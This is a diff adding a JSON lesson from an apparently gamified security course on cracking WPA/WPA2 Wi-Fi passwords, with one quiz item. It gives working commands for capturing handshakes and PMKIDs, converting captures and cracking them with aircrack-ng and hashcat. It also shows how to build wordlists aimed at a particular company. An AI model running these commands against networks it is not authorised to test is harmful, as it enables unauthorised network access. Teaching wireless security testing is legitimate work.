@@ -1,0 +1,79 @@
+{
+    "id": "l5",
+    "chapterId": "ch_9",
+    "title": "Cracking WPA/WPA2: The 4-Way Handshake 🤝",
+    "description": "Capture the handshake and crack the password using dictionary attacks.",
+    "xpReward": 45,
+    "estimatedMinutes": 15,
+    "section": "Attacks",
+    "slides": [
+        {
+            "id": "s_l5_1",
+            "type": "text",
+            "title": "From Handshake to Password 🔑",
+            "content": "# The Cracking Process\n\nYou have the `capture-01.cap` file containing the 4-Way Handshake. Now you need to crack it.\n\n**Tool: `aircrack-ng`**\n`aircrack-ng` takes the capture file and a **wordlist**. It runs through each password, computes the **Pairwise Master Key (PMK)** and **PTK**, and checks if the resulting **MIC** matches the one in the handshake.\n\n**Command:**\n```bash\naircrack-ng -w [wordlist] [capture_file]\n```\n\n**Example:**\n```bash\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap\n```\n\n**If the password is in the wordlist**, `aircrack-ng` will display:\n```\nKEY FOUND! [ password123 ]\n```"
+        },
+        {
+            "id": "s_l5_2",
+            "type": "quiz",
+            "title": "Cracking Process 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_1",
+                "type": "multiple_choice",
+                "question": "What does aircrack-ng compare to verify that a guessed password is correct?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The SSID name.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The Message Integrity Code (MIC) in the 4-Way Handshake.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The MAC address of the client.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The signal strength.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "The MIC is a cryptographic checksum. If the guessed password generates the same MIC, the password is correct.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l5_3",
+            "type": "text",
+            "title": "Optimizing the Crack: Hashcat 🚀",
+            "content": "# GPU Acceleration\n\n`aircrack-ng` uses the CPU. For large wordlists or brute-force masks, use **Hashcat** which leverages your **GPU** for massive speedups.\n\n**Step 1: Convert .cap to Hashcat format**\nUse the online tool at `https://hashcat.net/cap2hashcat/` or use `hcxpcapngtool`.\n```bash\nhcxpcapngtool -o hash.txt capture-01.cap\n```\n\n**Step 2: Crack with Hashcat**\n```bash\nhashcat -m 22000 hash.txt /usr/share/wordlists/rockyou.txt\n```\n- `-m 22000` : Hash mode for WPA-PBKDF2-PMKID+EAPOL.\n\n**Speed Comparison**: Hashcat on a decent GPU can test **500,000 passwords per second**. `aircrack-ng` might do **5,000**. This is the difference between waiting 2 hours and waiting 2 weeks."
+        },
+        {
+            "id": "s_l5_4",
+            "type": "text",
+            "title": "The PMKID Attack: No Clients Needed! 💡",
+            "content": "# Cracking WPA2 Without a Handshake\n\nDiscovered in 2018, the **PMKID attack** allows you to retrieve a crackable hash **without capturing a full handshake or deauthing clients**.\n\n**How It Works:**\nMany routers include the **PMKID** in the first EAPOL frame during association. This PMKID is derived from the PSK.\n\n**Tool: `hcxdumptool`**\n```bash\nsudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1\n```\n\n**Extract Hash:**\n```bash\nhcxpcapngtool -o pmkid_hash.txt dump.pcapng\n```\n\n**Crack with Hashcat (same mode 22000).**\n\n**Advantage**: **Passive and stealthy**. No deauth packets. Just wait for the AP to broadcast or a client to associate."
+        },
+        {
+            "id": "s_l5_5",
+            "type": "code",
+            "title": "Full Cracking Workflow with Hashcat 💻",
+            "content": "Complete example from capture to cracked password.",
+            "codeSnippet": "# 1. Capture (with PMKID or Handshake)\nsudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon\n# Wait for handshake or PMKID, then Ctrl+C.\n\n# 2. Convert to Hashcat format\nhcxpcapngtool -o hash.txt capture-01.cap\n\n# 3. Crack with Hashcat\nhashcat -m 22000 hash.txt /usr/share/wordlists/rockyou.txt\n\n# 4. Show cracked password\nhashcat -m 22000 hash.txt --show",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_6",
+            "type": "tip",
+            "title": "Pro Tip: Creating Targeted Wordlists 🚀",
+            "content": "## Better Than RockYou\n\nGeneric wordlists often fail. Build a **custom wordlist** based on the target:\n- Use **CeWL** to scrape the company website for keywords.\n- Add the company name, address numbers, local sports teams.\n- Use **Crunch** to generate passwords based on patterns (e.g., `CompanyName2024!`).\n\n```bash\ncewl -d 2 -m 5 -w keywords.txt https://target-company.com\n```"
+        }
+    ]
+}
